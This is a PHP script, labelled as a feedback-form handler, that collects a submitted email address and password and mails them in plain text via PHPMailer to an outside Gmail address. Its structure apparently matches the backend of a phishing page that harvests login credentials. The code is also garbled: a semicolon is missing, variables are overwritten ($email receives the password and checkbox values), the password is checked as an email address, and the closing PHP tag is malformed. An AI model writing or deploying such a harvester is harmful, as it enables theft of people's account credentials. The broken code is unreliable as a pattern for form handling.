<?php
session_start();
$data['result']='error'

function validStringLength($string,$min,$max) {
	$length = mb_strlen($string,'UTF-8');
	if (($length<$min) || ($length>$max)) {
		return false;
	}
	else {
		return true;
	}
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data['result']='success';
     if (isset($_POST['email'])) {
      $email = $_POST['email'];
      if (!filter_var($email,FILTER_VALIDATE_EMAIL)) {
        $data['email']='Email field entered incorrectly';
        $data['result']='error';
      }
    } else {
      $data['result']='error';
    }
     if (isset($_POST['password'])) {
      $email = $_POST['password'];
      if (!filter_var($password,FILTER_VALIDATE_EMAIL)) {
        $data['password']='Password field entered incorrectly';
        $data['result']='error';
      }
    } else {
      $data['result']='error';
    }
    if (isset($_POST['checkbox'])) {
      $email = $_POST['checkbox'];
      if (!filter_var($checkbox,FILTER_VALIDATE_EMAIL)) {
        $data['checkbox']='Checkbox field entered incorrectly';
        $data['result']='error';
      }
    } else {
      $data['result']='error';
    }
    if ($data['result']=='success') {
 
    $output = "---------------------------------" . "\n";
    $output .= date("d-m-Y H:i:s") . "\n";
    $output .= "Address email: " . $email . "\n";
    $output .= "Password: " . $password . "\n";
    $output .= "Checkbox: " . $checkbox . "\n";
    
 } 
  require_once dirname(__FILE__) . '/phpmailer/PHPMailerAutoload.php';
    
    $output = "Date: " . date("d-m-Y H:i") . "\n";
    $output .= "Address email: " . $email . "\n";
    $output .= "Password: " . $password . "\n";
    $output .= "Checkbox: " . $checkbox . "\n";
    
 
   
    $mail = new PHPMailer;
 
    $mail->CharSet = 'UTF-8'; 
    $mail->From      = 'myemail@mail.ru';
    $mail->FromName  = 'Site name';
    $mail->Subject   = 'Message from feedback form';
    $mail->Body      = $output;
    $mail->AddAddress( '7yatan@gmail.com' );
 
    
    if ($mail->Send()) {
      $data['result']='success';
    } else {
      $data['result']='error';
    }      
 
  }
  
  echo json_encode($data);  
>